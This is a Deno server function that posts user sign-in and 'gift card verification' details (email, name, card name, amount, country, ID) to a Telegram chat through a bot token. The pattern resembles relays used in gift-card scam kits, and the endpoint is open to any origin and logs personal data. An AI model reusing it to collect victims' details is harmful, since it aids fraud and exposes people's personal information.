import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotification {
  type: 'sign_in' | 'verification';
  userEmail?: string;
  firstName?: string;
  lastName?: string;
  giftcardName?: string;
  amount?: string;
  country?: string;
  verificationId?: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials');
      return new Response(
        JSON.stringify({ error: 'Missing Telegram credentials' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const notificationData: TelegramNotification = await req.json();
    console.log('Received notification request:', notificationData);

    let message = '';
    
    if (notificationData.type === 'sign_in') {
      message = `🔐 *New User Sign In*\n\n` +
                `📧 Email: ${notificationData.userEmail}\n` +
                `👤 Name: ${notificationData.firstName || 'N/A'} ${notificationData.lastName || 'N/A'}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;
    } else if (notificationData.type === 'verification') {
      message = `🎁 *New Gift Card Verification*\n\n` +
                `📧 Email: ${notificationData.userEmail}\n` +
                `🎫 Gift Card: ${notificationData.giftcardName}\n` +
                `💰 Amount: $${notificationData.amount}\n` +
                `🌍 Country: ${notificationData.country}\n` +
                `🆔 ID: ${notificationData.verificationId}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const telegramResponse = await response.json();
    
    if (!response.ok) {
      console.error('Telegram API error:', telegramResponse);
      return new Response(
        JSON.stringify({ error: 'Failed to send Telegram message', details: telegramResponse }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Telegram notification sent successfully:', telegramResponse);

    return new Response(
      JSON.stringify({ success: true, telegramResponse }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});